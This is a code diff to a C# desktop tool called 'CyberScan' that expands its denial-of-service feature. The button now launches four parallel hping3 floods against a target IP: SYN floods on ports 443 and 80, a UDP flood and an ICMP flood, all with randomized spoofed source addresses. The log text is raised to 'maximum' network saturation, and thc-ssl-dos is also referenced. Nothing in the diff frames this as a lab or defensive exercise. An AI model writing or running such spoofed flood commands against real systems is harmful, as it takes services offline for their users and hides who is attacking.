@@ -143,34 +143,48 @@ namespace CyberScan
             StatusText.Foreground = Avalonia.Media.Brushes.Red;
         }
 
-        // --- フェーズ2A: DoS攻撃 (hping3) ---
+        // --- フェーズ2A: DoS攻撃 (hping3 - 4並列実行) ---
         private async void OnDosAttackClick(object sender, RoutedEventArgs e)
         {
             DisableAttackButtons();
-            StatusText.Text = "STATUS: EXECUTING DoS ATTACK...";
+            StatusText.Text = "STATUS: EXECUTING MAXIMUM LOAD ATTACK...";
             StatusText.Foreground = Avalonia.Media.Brushes.Red; // 警告色
 
             WriteLog("\n==========================================");
-            WriteLog($"[*] INITIATING SIMULTANEOUS DoS ATTACK...");
+            WriteLog($"[*] INITIATING MULTI-VECTOR FULL FLOOD...");
             WriteLog($"[*] DURATION LIMIT: {_ddosDuration} SECONDS");
-            WriteLog("[!] WARNING: EXTREME NETWORK LOAD.");
+            WriteLog("[!] WARNING: MAXIMIZING NETWORK SATURATION.");
             WriteLog("==========================================");
 
-            // 攻撃コマンドの準備
+            // 攻撃コマンドの準備 (4つの異なるベクトルを同時展開)
+            
+            // 1. TCP SYN Flood (HTTPS/443) - Webサーバー処理負荷
             string args1 = $"{_ddosDuration}s hping3 -S -p 443 --flood --rand-source {_targetIp}";
-            string args2 = $"{_ddosDuration}s hping3 -1 --flood -d 3600 --rand-source {_targetIp}";
+            
+            // 2. TCP SYN Flood (HTTP/80) - 別のWebポートへの負荷
+            string args2 = $"{_ddosDuration}s hping3 -S -p 80 --flood --rand-source {_targetIp}";
 
-            WriteLog("\n[*] LAUNCHING VECTOR A: TCP SYN FLOOD (Port 443)");
-            WriteLog("[*] LAUNCHING VECTOR B: ICMP LARGE PACKET FLOOD");
+            // 3. UDP Flood - 帯域幅の消費
+            string args3 = $"{_ddosDuration}s hping3 --udp --flood --rand-source {_targetIp}";
 
-            // タスクを並列で開始
+            // 4. ICMP Large Packet Flood - パケット処理負荷
+            string args4 = $"{_ddosDuration}s hping3 -1 --flood -d 1200 --rand-source {_targetIp}";
+
+            WriteLog("\n[*] [THREAD 1] TCP SYN FLOOD (Target: Port 443)");
+            WriteLog("[*] [THREAD 2] TCP SYN FLOOD (Target: Port 80)");
+            WriteLog("[*] [THREAD 3] UDP FLOOD (Random Ports)");
+            WriteLog("[*] [THREAD 4] ICMP PACKET FLOOD (Size: 1200)");
+
+            // タスクを4並列で開始
             var task1 = RunAttackToolAsync("timeout", args1);
             var task2 = RunAttackToolAsync("timeout", args2);
+            var task3 = RunAttackToolAsync("timeout", args3);
+            var task4 = RunAttackToolAsync("timeout", args4);
 
-            // 両方の攻撃が終わるのを待つ
-            await Task.WhenAll(task1, task2);
+            // すべての攻撃が終わるのを待つ
+            await Task.WhenAll(task1, task2, task3, task4);
 
-            WriteLog("\n[ATTACK STOPPED] ALL FLOOD ATTACKS COMPLETE.");
+            WriteLog("\n[ATTACK STOPPED] ALL THREADS TERMINATED.");
             EnableAttackButtons();
             StatusText.Text = "STATUS: READY FOR NEXT COMMAND.";
         }
@@ -266,7 +280,7 @@ namespace CyberScan
                 if (command.Contains("hping3") || args.Contains("hping3"))
                 {
                      WriteLog("[SIMULATION] Sending packet floods...");
-                     WriteLog("[SIMULATION] Source IP: Random / Protocol: ICMP/TCP");
+                     WriteLog("[SIMULATION] Source IP: Random / Protocol: ICMP/TCP/UDP");
                 }
                 else if (command.Contains("thc-ssl-dos") || args.Contains("thc-ssl-dos"))
                 {
